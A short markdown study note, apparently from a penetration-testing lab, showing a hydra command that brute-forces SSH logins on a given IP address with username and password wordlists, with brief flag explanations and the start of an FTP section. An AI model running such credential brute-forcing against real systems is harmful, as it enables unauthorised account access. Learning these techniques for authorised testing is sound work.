#BruteForcing #ServiceAutrhentication #LoginFormAttack 

### SSH Attack
To use hydra to attack a login service looks like:
``` bash
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4

# Provided username and password wordlists
# Add service://SERVER_IP:PORT 
# -t 4 -> max number of parallel attempts
```
### FTP Brute Forcing
After we are logged into SSH, we can check other users on the system. 